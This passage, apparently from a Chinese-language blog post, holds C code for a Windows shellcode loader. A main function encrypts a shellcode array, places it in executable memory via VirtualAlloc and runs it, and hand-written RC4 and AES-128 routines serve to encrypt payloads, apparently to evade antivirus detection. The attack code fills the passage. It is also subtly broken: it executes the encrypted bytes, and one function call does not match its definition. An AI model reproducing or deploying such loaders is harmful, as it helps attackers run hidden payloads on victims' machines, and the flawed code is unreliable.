class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 主函数示例 ---</span></span><br><span class="line"><span class="comment">// 加密Shellcode后分配内存并执行</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 示例Shellcode</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[] = <span class="string">&quot;1234567890123456&quot;</span>; <span class="comment">// 16字节密钥</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iv[]  = <span class="string">&quot;1234567890123456&quot;</span>; <span class="comment">// 16字节初始化向量</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> shellcode_len = <span class="built_in">sizeof</span>(shellcode) - <span class="number">1</span>; <span class="comment">// 排除字符串结束符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行AES CBC加密（原地加密，填充可能会扩充数据，使用时请确保足够空间）</span></span><br><span class="line">    <span class="built_in">aes_encrypt</span>(shellcode, shellcode_len, key, iv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配内存并执行加密后的Shellcode</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, shellcode_len);</span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="参考代码">参考代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------- RC4加密 ----------------</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> data_len, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">int</span> key_len)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line">    <span class="type">int</span> i, j = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化S数组</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        S[i] = (<span class="type">unsigned</span> <span class="type">char</span>)i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 密钥调度算法 (KSA)</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + S[i] + key[i % key_len]) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> temp = S[i];</span><br><span class="line">        S[i] = S[j];</span><br><span class="line">        S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 伪随机数生成算法 (PRGA)</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; data_len; k++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        j = (j + S[i]) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> temp = S[i];</span><br><span class="line">        S[i] = S[j];</span><br><span class="line">        S[j] = temp;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> rnd = S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>];</span><br><span class="line">        data[k] ^= rnd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------- AES加密（纯C实现，无第三方库） ----------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// AES S-box</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</span><br><span class="line">    <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</span><br><span class="line">    <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</span><br><span class="line">    <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</span><br><span class="line">    <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</span><br><span class="line">    <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES Rcon数组，用于密钥扩展</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> Rcon[<span class="number">11</span>] = &#123; </span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x08</span>,<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="number">0x80</span>,<span class="number">0x1B</span>,<span class="number">0x36</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// xtime函数：GF(2^8)中乘2运算</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">xtime</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; <span class="number">1</span>) ^ ((x &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span> ? <span class="number">0x1B</span> : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加轮密钥</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddRoundKey</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>], <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> roundKey[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        state[i] ^= roundKey[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字节代换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SubBytes</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        state[i] = sbox[state[i]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 行移位</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShiftRows</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">16</span>];</span><br><span class="line">    <span class="comment">// 第一行</span></span><br><span class="line">    temp[<span class="number">0</span>]  = state[<span class="number">0</span>];</span><br><span class="line">    temp[<span class="number">4</span>]  = state[<span class="number">4</span>];</span><br><span class="line">    temp[<span class="number">8</span>]  = state[<span class="number">8</span>];</span><br><span class="line">    temp[<span class="number">12</span>] = state[<span class="number">12</span>];</span><br><span class="line">    <span class="comment">// 第二行左移1位</span></span><br><span class="line">    temp[<span class="number">1</span>]  = state[<span class="number">5</span>];</span><br><span class="line">    temp[<span class="number">5</span>]  = state[<span class="number">9</span>];</span><br><span class="line">    temp[<span class="number">9</span>]  = state[<span class="number">13</span>];</span><br><span class="line">    temp[<span class="number">13</span>] = state[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 第三行左移2位</span></span><br><span class="line">    temp[<span class="number">2</span>]  = state[<span class="number">10</span>];</span><br><span class="line">    temp[<span class="number">6</span>]  = state[<span class="number">14</span>];</span><br><span class="line">    temp[<span class="number">10</span>] = state[<span class="number">2</span>];</span><br><span class="line">    temp[<span class="number">14</span>] = state[<span class="number">6</span>];</span><br><span class="line">    <span class="comment">// 第四行左移3位</span></span><br><span class="line">    temp[<span class="number">3</span>]  = state[<span class="number">15</span>];</span><br><span class="line">    temp[<span class="number">7</span>]  = state[<span class="number">3</span>];</span><br><span class="line">    temp[<span class="number">11</span>] = state[<span class="number">7</span>];</span><br><span class="line">    temp[<span class="number">15</span>] = state[<span class="number">11</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(state, temp, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列混合</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MixColumns</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> col = i * <span class="number">4</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> a0 = state[col];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> a1 = state[col<span class="number">+1</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> a2 = state[col<span class="number">+2</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> a3 = state[col<span class="number">+3</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b0 = <span class="built_in">xtime</span>(a0) ^ (<span class="built_in">xtime</span>(a1) ^ a1) ^ a2 ^ a3;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b1 = a0 ^ <span class="built_in">xtime</span>(a1) ^ (<span class="built_in">xtime</span>(a2) ^ a2) ^ a3;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b2 = a0 ^ a1 ^ <span class="built_in">xtime</span>(a2) ^ (<span class="built_in">xtime</span>(a3) ^ a3);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b3 = (<span class="built_in">xtime</span>(a0) ^ a0) ^ a1 ^ a2 ^ <span class="built_in">xtime</span>(a3);</span><br><span class="line">        state[col]   = b0;</span><br><span class="line">        state[col<span class="number">+1</span>] = b1;</span><br><span class="line">        state[col<span class="number">+2</span>] = b2;</span><br><span class="line">        state[col<span class="number">+3</span>] = b3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥扩展：16字节密钥扩展到176字节轮密钥</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">KeyExpansion</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">char</span> roundKeys[<span class="number">176</span>])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(roundKeys, key, <span class="number">16</span>);</span><br><span class="line">    <span class="type">int</span> bytesGenerated = <span class="number">16</span>;</span><br><span class="line">    <span class="type">int</span> rconIteration = <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (bytesGenerated &lt; <span class="number">176</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">            temp[i] = roundKeys[bytesGenerated - <span class="number">4</span> + i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bytesGenerated % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 循环左移1字节</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> t = temp[<span class="number">0</span>];</span><br><span class="line">            temp[<span class="number">0</span>] = temp[<span class="number">1</span>];</span><br><span class="line">            temp[<span class="number">1</span>] = temp[<span class="number">2</span>];</span><br><span class="line">            temp[<span class="number">2</span>] = temp[<span class="number">3</span>];</span><br><span class="line">            temp[<span class="number">3</span>] = t;</span><br><span class="line">            <span class="comment">// S-box代换</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">                temp[i] = sbox[temp[i]];</span><br><span class="line">            <span class="comment">// 与Rcon异或</span></span><br><span class="line">            temp[<span class="number">0</span>] ^= Rcon[rconIteration];</span><br><span class="line">            rconIteration++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            roundKeys[bytesGenerated] = roundKeys[bytesGenerated - <span class="number">16</span>] ^ temp[i];</span><br><span class="line">            bytesGenerated++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对单个16字节数据块进行AES-128加密</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AES_encrypt_block</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> in[<span class="number">16</span>], <span class="type">unsigned</span> <span class="type">char</span> out[<span class="number">16</span>], <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> roundKeys[<span class="number">176</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(state, in, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始轮密钥加</span></span><br><span class="line">    <span class="built_in">AddRoundKey</span>(state, roundKeys);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9轮常规轮</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> round = <span class="number">1</span>; round &lt; <span class="number">10</span>; round++) &#123;</span><br><span class="line">        <span class="built_in">SubBytes</span>(state);</span><br><span class="line">        <span class="built_in">ShiftRows</span>(state);</span><br><span class="line">        <span class="built_in">MixColumns</span>(state);</span><br><span class="line">        <span class="built_in">AddRoundKey</span>(state, roundKeys + round * <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 第10轮（无MixColumns）</span></span><br><span class="line">    <span class="built_in">SubBytes</span>(state);</span><br><span class="line">    <span class="built_in">ShiftRows</span>(state);</span><br><span class="line">    <span class="built_in">AddRoundKey</span>(state, roundKeys + <span class="number">10</span> * <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(out, state, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC模式下的AES加密（零填充）</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> data_len, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">unsigned</span> <span class="type">char</span> *iv, <span class="type">int</span> *padded_len)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 计算填充后的数据长度</span></span><br><span class="line">    <span class="type">int</span> len = ((data_len + <span class="number">15</span>) / <span class="number">16</span>) * <span class="number">16</span>;</span><br><span class="line">    *padded_len = len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buffer = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, data, data_len);</span><br><span class="line">    <span class="built_in">memset</span>(buffer + data_len, <span class="number">0</span>, len - data_len);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> roundKeys[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">KeyExpansion</span>(key, roundKeys);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> prev[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(prev, iv, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对每个16字节块进行CBC加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            buffer[i+j] ^= prev[j];</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span 